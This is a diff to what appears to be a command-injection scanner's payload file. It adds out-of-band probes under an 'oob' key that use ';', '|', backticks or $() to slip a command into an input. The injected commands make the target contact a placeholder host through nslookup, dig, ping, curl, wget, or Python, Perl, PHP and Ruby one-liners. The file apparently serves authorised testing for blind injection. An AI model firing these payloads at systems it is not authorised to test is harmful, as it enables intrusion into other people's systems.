@@ -27,11 +27,54 @@ payloads:
     - "; ping -c 10 127.0.0.1"
 
   oob:
+    # DNS-based — nslookup (cross-platform)
     - "; nslookup {oob}"
     - "| nslookup {oob}"
     - "` nslookup {oob}`"
     - "$(nslookup {oob})"
+    - "| nslookup -q=any {oob}"
+    - "; nslookup -q=any {oob}"
+
+    # DNS-based — dig (Unix)
+    - "; dig {oob}"
+    - "| dig {oob}"
+    - "` dig {oob}`"
+    - "$(dig {oob})"
+
+    # DNS-based — host (Unix)
+    - "; host {oob}"
+    - "| host {oob}"
+    - "` host {oob}`"
+
+    # DNS-based — ping (triggers DNS resolution)
+    - "; ping -c 1 {oob}"
+    - "| ping -c 1 {oob}"
+    - "` ping -c 1 {oob}`"
+
+    # HTTP-based — curl (cross-platform)
     - "; curl http://{oob}/cmd"
     - "| curl http://{oob}/cmd"
     - "$(curl http://{oob}/cmd)"
+    - "` curl http://{oob}/cmd`"
+
+    # HTTP-based — wget (Unix)
     - "; wget http://{oob}/cmd"
+    - "| wget http://{oob}/cmd"
+    - "` wget http://{oob}/cmd`"
+
+    # HTTP-based — fetch (FreeBSD/macOS)
+    - "; fetch http://{oob}/cmd"
+    - "| fetch http://{oob}/cmd"
+
+    # HTTP-based — Python urllib
+    - "; python -c \"import urllib.request; urllib.request.urlopen('http://{oob}/cmd')\""
+    - "; python3 -c \"import urllib.request; urllib.request.urlopen('http://{oob}/cmd')\""
+
+    # HTTP-based — Perl LWP
+    - "; perl -e \"use LWP::Simple; get('http://{oob}/cmd')\""
+
+    # HTTP-based — PHP file_get_contents
+    - "; php -r \"file_get_contents('http://{oob}/cmd');\""
+
+    # HTTP-based — Ruby net/http
+    - "; ruby -e \"require 'net/http'; Net::HTTP.get(URI('http://{oob}/cmd'))\""
